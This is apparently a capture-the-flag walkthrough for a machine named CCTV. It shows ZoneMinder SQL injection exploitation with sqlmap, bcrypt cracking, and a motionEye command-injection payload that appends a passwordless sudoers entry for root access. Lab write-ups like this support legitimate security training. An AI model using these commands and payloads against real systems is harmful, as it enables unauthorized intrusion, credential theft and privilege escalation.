<h1> CCTV </h1>

<h2> Enumeration </h2>

***nmap scan***

``` nmap -sV <IP> ```

-sV -- search for services running actively.


### Port - 80 ::

<img width="1378" height="850" alt="Screenshot 2026-05-09 at 12 22 47" src="https://github.com/user-attachments/assets/47ac486b-fd36-444f-829d-b47982bf585c" />


at the endpoint ```cctv.htb/zm``` (login) - we will be redirected to zone minder login page.


<img width="1385" height="364" alt="Screenshot 2026-05-09 at 12 24 40" src="https://github.com/user-attachments/assets/65b1228d-7e0e-440f-b78f-bd26ea7eb7cb" />


Zone minder -- opensource software which is used for the cctv surveillance which is natively run on the linux machines.


***default credentials***
```
username : admin
password : admin
```

### CVE-2024-51482

### Boolean-based SQL Injection in ZoneMinder 1.37.63

in the api endpoint ```web/ajax/event.php``` the parameter ```tid``` is not handling the user input and directly injecting to the "where" clause causing the boolean sql injection  .

the parameter is not attached to the ui of the site so from cve doc navigated to the endpoint and end parameter .

```http://hostname_or_ip/zm/index.php?view=request&request=event&action=removetag&tid=1```

<h2> SQL mapping</h2>

using sql map to automate the exploitation of the database.

getting database name ::

```sqlmap -u "http://cctv.htb/zm/index.php?view=request&request=event&action=removetag&tid=1" --cookie="ZMSESSID=sdvf8dut513lbb3g18526692qf" --dbms=mysql --dbs --batch --threads=10```

--dbms  --> db management is mysql.
--dbs   --> instructing to enumerate the databases preset
--batch --> to proceed with the default sqlmapping settings 
--threads --> the number of requests to be sent parallely at a time.

``` database name - zm``` 

getting tables in zm db ::

```sqlmap -u "http://cctv.htb/zm/index.php?view=request&request=event&action=removetag&tid=1" --cookie="ZMSESSID=sdvf8dut513lbb3g18526692qf" --dbms=mysql -D zm --tables --batch --threads=10```

there are many tables the default table is users.

``` tables - Users```

exploiting the Users table ::

instead of getting all the columns focus on username,password .

Users :

```
superadmin :: $2y$10$cmytVWFRnt1XfqsItsJRVe/ApxWxcIFQcURnm5N.rhlULwM0jrtbm
admin :: $2y$10$t5z8uIT.n9uCdHCNidcLf.39T1Ui9nrlCkdXrzJMnJgkTiAvRUM6m
mark :: $2y$10$prZGnazejKcuTv5bKNexXOgLyQaok0hq07LW7AJ/QNqZolbXKfFG.
```

### Hashcat

hash identified -- bcrypt 

```
hashcat -3200 -a mark.txt rockyou.txt
```

```
mark -- opensesame
```

## SSH - mark

in the /etc directory we got the motioneye directory .

motioneye -- frontend application used to run the motion deamon and to turn cameras into surveillance system . 

in /etc/motion.conf

got the admin credentials 

```
username - admin
password - 989c5a8ee87a0e9521ec81a79187d162109282f0
```

Checking for services running here :: ``` netstat -tulpn```

-t -- tcp connections
-u -- udp connections 
-l -- services which are listening 
-p -- to mention the program that is running 
-n -- to mention the address also (ip)


### port -- 8765

this port is hosting the motioneye but locally so we cannot access it from our machine noramly .

### Port forwarding 

local port forwarding -- used to connect to a service which is running locally on a system with another system by forwarding . 

```
ssh -L [local_port]:[target_host]:[target_port] user@ssh_server
```

local port -- the port that our machine(attacker) will open to listen .
target host -- the address that is running in the other machine ( that is localhost[127.0.0.1] here )
target port -- the port where the service is running there in the other machine 

### Motioneye - 0.43.1b4 

got into the motioneye site using the above credentials


<img width="1470" height="956" alt="Screenshot 2026-05-09 at 15 52 14" src="https://github.com/user-attachments/assets/8fae1b71-9d74-4d29-996b-c91546c5a635" />


### CVE 2025-60787  -- RCE 

the user input in the web ui is sanitising only in the client side but not in the server side .

over ride the ```configUiValid``` to bypass the client side sanitization.

```
configUiValid = function() { return true; };
```

**Attack** : editing the sudoers file and adding the mark user there so that he can execute every thing as a sudo user.

```
payload ::
$(echo 'mark ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers).%Y-%m-%d-%H-%M-%S
```

<img width="546" height="166" alt="Screenshot 2026-05-09 at 16 16 58" src="https://github.com/user-attachments/assets/f7e93c36-5adc-466e-b0f7-2cbdf35ba06c" />

keep the capture mode into interval snapshots to trigger it automatically .

mark got the sudo privilages on whole machine.

<img width="771" height="146" alt="Screenshot 2026-05-09 at 16 19 19" src="https://github.com/user-attachments/assets/acf9a142-9c28-4ca5-b347-f16b3300addc" />


root flag :: 58e1df5367efe72b2acb8cd44339f03a

user flag was in /home/sa_mark/user.txt

user flag :: 9355c8d48e58802c3871420f8d4eb5dd


